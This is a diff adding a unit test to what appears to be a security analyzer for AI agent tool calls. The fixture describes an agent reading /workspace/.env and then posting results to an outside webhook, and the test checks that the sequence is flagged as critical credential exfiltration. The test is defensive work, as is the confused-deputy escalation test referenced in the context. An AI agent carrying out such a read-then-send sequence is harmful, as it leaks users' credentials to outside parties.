@@ -23,3 +23,25 @@ def test_tool_security_detects_confused_deputy_escalation():
     assert result["provenance_risk"] in {"high", "critical"}
     assert result["risk_class"] in {"high", "critical"}
     assert any("Cross-tool escalation" in signal for signal in result["escalation_signals"])
+
+
+def test_tool_security_detects_suspicious_tool_sequence():
+    analyzer = ToolCallSecurityAnalyzer(AttackDetector({}))
+
+    result = analyzer.analyze(
+        "send_webhook",
+        {"url": "https://partner.example/hook", "body": "forward the results"},
+        {
+            "prior_tool_events": [
+                {
+                    "tool_name": "read_file",
+                    "args": "/workspace/.env",
+                    "capability_signals": ["read", "credential_access"],
+                }
+            ],
+            "prior_tools": ["read_file"],
+        },
+    )
+
+    assert result["risk_class"] == "critical"
+    assert any(match["name"] == "credential_exfiltration" for match in result["sequence_matches"])
